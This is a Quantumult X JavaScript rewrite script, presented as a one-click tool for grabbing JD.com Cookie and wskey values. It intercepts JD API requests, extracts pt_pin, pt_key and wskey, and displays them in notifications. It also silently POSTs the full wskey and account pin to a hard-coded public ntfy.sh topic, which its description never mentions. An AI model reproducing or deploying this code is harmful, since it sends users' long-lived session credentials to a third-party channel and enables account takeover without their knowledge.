/**
 * 京东 Cookie + Wskey 一键抓取 (Quantumult X)
 *
 * 圈X → 风车 → 重写 → 右上角+ → 类型: script-request-header
 * URL: ^https?://api\.m\.jd\.com/
 */

const cookie = $request.headers['Cookie'] || $request.headers['cookie'] || '';
const NTFY_URL = 'https://ntfy.sh/HzjHy2codes';

if (!cookie) { $done({}); }

// ==== 调试：打完整cookie到日志（确认脚本执行了） ====
console.log('[JD-DEBUG] cookie片段(前200): ' + cookie.substring(0, 200));

// ==== 提取所有可能的 pin ====
const pt_pin = (cookie.match(/pt_pin=([^;]+)/) || [])[1];       // pt_pin=jd_xxx
const rawPin = (cookie.match(/(?:^|;\s*)pin=([^;]+)/) || [])[1]; // pin=jd_xxx（非pt_开头）

// ==== 提取 key ====
const pt_key = (cookie.match(/pt_key=([^;]+)/) || [])[1];       // pt_key=app_open...
const wskey  = (cookie.match(/wskey=([^;]+)/)  || [])[1];       // wskey=AAJ...

// 实际使用的 pin（优先 pt_pin，其次 pin）
const pin = pt_pin || rawPin;

console.log('[JD-DEBUG] pt_pin=' + (pt_pin||'无') + ' raw_pin=' + (rawPin||'无') + ' pt_key=' + (pt_key||'无') + ' wskey=' + (wskey||'无').substring(0,20));

// ==================== 弹窗：pt_key ====================
if (pin && pt_key) {
  const dk = 'jd_pt_' + pin;
  if ((Date.now() - parseInt($persistentStore.read(dk)||'0')) > 300000) {
    $persistentStore.write(String(Date.now()), dk);
    $notification.post('🔑 京东Cookie', pin, pt_key);
    console.log('[JD-CK] 弹窗: ' + pin);
  } else {
    console.log('[JD-CK] 去重跳过: ' + pin);
  }
}

// ==================== 弹窗：wskey ====================
if (wskey) {
  const dk = 'jd_ws_' + (pin || 'no') + '_' + wskey.substring(0, 12);
  if ((Date.now() - parseInt($persistentStore.read(dk)||'0')) > 300000) {
    $persistentStore.write(String(Date.now()), dk);
    $notification.post('🔐 京东WSKEY', pin || '(无pin)', 'wskey=' + wskey.substring(0, 40) + '...');
    console.log('[JD-WS] 弹窗+推送: ' + (pin||'?'));

    $httpClient.post({
      url: NTFY_URL,
      headers: { 'Content-Type': 'text/plain', Title: 'JD_wskey_' + (pin || 'unknown') },
      body: 'JDWSKEY pin=' + (pin || 'unknown') + ';wskey=' + wskey + ';'
    }, () => {});
  } else {
    console.log('[JD-WS] 去重跳过');
  }
}

$done({});
